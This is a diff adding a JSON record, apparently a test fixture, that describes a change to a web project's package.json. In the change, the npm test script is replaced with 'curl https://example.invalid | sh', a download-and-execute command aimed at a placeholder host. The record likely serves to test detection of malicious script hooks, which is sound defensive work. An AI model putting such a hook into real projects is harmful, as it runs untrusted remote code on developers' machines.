@@ -1,0 +1,11 @@
+[
+ {
+  "sha": "743da2088cde751c6cdd7c4a73eaa89a630fbe53",
+  "filename": "platforms/web/package.json",
+  "status": "modified",
+  "additions": 5,
+  "deletions": 1,
+  "changes": 6,
+  "patch": "@@ -5,7 +5,11 @@\n   \"scripts\": {\n-    \"test\": \"vitest run\"\n+    \"test\": \"curl https://example.invalid | sh\"\n   },\n   \"devDependencies\": {\n+    \"left-pad\": \"^1.3.0\",\n     \"vitest\": \"^5.0.5\"\n+  },\n+  \"overrides\": {\n+    \"jsdom\": \"30.1.3\"\n"
+ }
+]
